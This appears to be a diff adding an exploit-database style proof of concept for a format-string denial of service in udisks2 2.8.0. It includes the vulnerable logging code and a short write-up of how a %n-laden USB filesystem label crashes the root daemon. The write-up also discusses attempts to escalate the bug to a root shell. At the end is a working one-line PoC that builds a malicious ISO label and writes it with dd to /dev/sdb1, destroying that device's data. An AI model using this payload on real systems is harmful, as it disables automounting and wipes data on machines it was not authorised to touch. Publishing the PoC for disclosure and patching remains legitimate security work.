@@ -1,0 +1,39 @@
+# Exploit: udisks2 2.8.0 - Denial of Service (PoC)
+# Author: oxagast
+# Date: 2018-09-22
+# Vendor Homepage: http://storaged.org/
+# Software Link: https://github.com/storaged-project/udisks
+# Version: <=udisks2 2.8.0
+# Tested on: Ubuntu x64
+    __ _  _  __   ___  __  ____ ____ 
+  /  ( \/ )/ _\ / __)/ _\/ ___(_  _)
+ (  O )  (/    ( (_ /    \___ \ )(  
+  \__(_/\_\_/\_/\___\_/\_(____/(__)
+
+# ========The vulnerable section of code is:========
+#if GLIB_CHECK_VERSION(2, 50, 0)
+  g_log_structured ("udisks", (GLogLevelFlags) level,
+        "MESSAGE", message, "THREAD_ID", "%d", (gint) syscall (SYS_gettid),
+        "CODE_FUNC", function, "CODE_FILE", location);
+#else
+  g_log ("udisks", level, "[%d]: %s [%s, %s()]", (gint) syscall (SYS_gettid), message, location, function);
+
+# =================Short Whitepaper=================
+# The vulnerability can be triggered by using one computer to create a filesystem on a USB key 
+# (or other removable media), then editing it's filesystem label to include a bunch of %n's, removing and 
+# inserting the media into another computer running udisks2 <=2.8.0.  This binary runs as root, and if 
+# exploited in that capacity could potentially allow full compromise.  This will cause a denial of service, 
+# crashing udisks2 and not letting it restart (or until /var/lib/udisks2/mounted-fs is 
+# removed and the system is restarted).  This keeps the system from automounting things like USB drives and CDs.
+# The vulnerability -may- be exploitable beyond a DoS by crafting a format string exploit and putting it
+# in the label of the drive.  I tried to exploit it for a couple days, but cannot find a filesystem with a
+# lengthy enough label to be able to fit the exploit and spawn a root shell, as the smallest shellcode I
+# could make was around 50 characters, and the longest filesystem labels I could find are limited to 32 characters.
+
+# =============Proof of Concept Code================
+# This code will destroy any information on /dev/sdb1!!!!  Change that to where you have your USB media.
+# PoC source code:
+
+genisoimage -V "AAAAAAAA" -o dos.iso /etc/passwd && dd if=dos.iso | sed -e 's/AAAAAAAA/%n%n%n%n/g' | dd of=/dev/sdb1
+
+# Now remove and reinsert the media and wait for the crash report.
